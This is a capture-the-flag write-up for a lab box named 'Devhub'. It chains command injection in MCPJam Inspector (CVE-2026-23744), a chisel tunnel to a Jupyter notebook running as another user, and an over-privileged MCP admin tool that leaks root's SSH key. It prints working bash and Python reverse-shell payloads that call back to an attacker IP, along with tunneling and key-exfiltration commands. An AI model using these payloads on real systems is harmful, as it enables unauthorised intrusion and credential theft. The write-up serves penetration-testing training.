# CTF – Devhub (Writeup)

## Context

Linux box themed around developer tooling. The foothold is an exposed MCPJam Inspector (a Model Context Protocol dev tool) vulnerable to CVE-2026-23744. From there I pivot through a Jupyter notebook running as another user, then abuse a custom "ops" MCP server that dumps root's SSH key on request.

## Recon

No nmap file in my notes. The services that mattered:

- An **MCPJam Inspector** web service (RCE via CVE-2026-23744).
- A **Jupyter notebook** bound to `localhost:8888`, running as the `analyst` user.
- A local **ops MCP server** (`/opt/opsmcp/server.py`) listening on `127.0.0.1:5000` with an API-key-protected admin tool.

## Initial access – MCPJam Inspector RCE (CVE-2026-23744)

CVE-2026-23744 is a command-injection / unauthenticated RCE in MCPJam Inspector. The `/api/mcp/connect` endpoint takes a `serverConfig` describing a command to spawn; nothing stops you from pointing that at an arbitrary binary with arbitrary args. `CVE-2026-23744.py` posts a config that runs a bash reverse shell:

```
python3 CVE-2026-23744.py -u http://<target> -i 10.10.15.65 -p 1234
```

The body it sends:

```json
{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.65/1234 0>&1"],"env":{}},"serverId":"exploit"}
```

`nc -lvnp 1234` catches the first shell.

## Pivot – chisel tunnel to the analyst Jupyter

The interesting service (Jupyter) is bound to localhost as `analyst`, so I tunnel it back with chisel.

Attacker:

```
chisel server --port 8080 --reverse
```

Target:

```
./chisel client 10.10.15.65:8080 R:8888:localhost:8888
```

That exposes the target's `localhost:8888` Jupyter on my own `localhost:8888`. The notebook token is visible in `analyst`'s process list (`ps aux`), so I authenticate with it and open a Python notebook.

Running this cell in the notebook gives a shell as `analyst`:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.65",1234))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

(Caught on a second `nc -lvnp 1234`.)

## Enumeration – ops MCP server secret

As `analyst` I can read `/opt/opsmcp/server.py`. It contains the admin API key for the ops MCP server:

```
X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

The server exposes an `ops._admin_dump` tool that returns sensitive material — including SSH keys — when called with `confirm: true`.

## Privilege escalation – admin dump of root's SSH key

With the key I call the admin dump tool and ask for `ssh_keys`:

```
curl -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

That returns root's OpenSSH private key (comment `root@devhub`). I write it out and SSH straight to root:

```
cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 /tmp/root_key
ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@127.0.0.1
```

Root.

(`linpeas.sh` was also staged on the box for enumeration, and a Dirty-Pipe-style `su`-overwrite script was kept as a local fallback, but the dumped root key made both unnecessary.)

## Conclusion

Unauthenticated RCE in MCPJam Inspector (CVE-2026-23744) gave the first shell. A chisel reverse tunnel reached a Jupyter instance running as `analyst`, whose token was leaking in the process list, giving a second shell. Reading the ops MCP source recovered its admin API key, and the server's own `_admin_dump` tool handed over root's private key.

## Skills demonstrated

- Exploiting MCP-server command injection for RCE (CVE-2026-23744)
- Reverse port-forwarding with chisel to reach localhost-only services
- Recovering a Jupyter token from `ps aux` and executing a notebook reverse shell
- Source review to recover a hardcoded API key
- Abusing an over-privileged admin/debug tool to exfiltrate an SSH private key
